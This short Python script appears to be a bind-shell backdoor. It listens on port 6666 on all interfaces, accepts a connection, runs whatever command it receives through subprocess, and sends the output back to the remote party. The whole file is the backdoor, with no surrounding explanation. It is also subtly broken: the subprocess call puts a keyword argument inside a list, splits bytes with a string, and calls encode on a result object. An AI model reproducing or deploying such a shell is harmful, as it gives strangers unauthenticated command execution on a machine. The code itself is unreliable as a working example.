import socket, subprocess, platform

addr = ""
port = 6666


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((addr, port))
s.listen(1)

connection, address = s.accept()


print(f"connected established with {address} at port {port}")

while True:
    try:
        data = connection.recv(1024)
        command_response = subprocess.run([data.split(" "), capture_output=True])
        connection.sendall(command_response.encode())
    except KeyboardInterrupt:
        print("Bye...")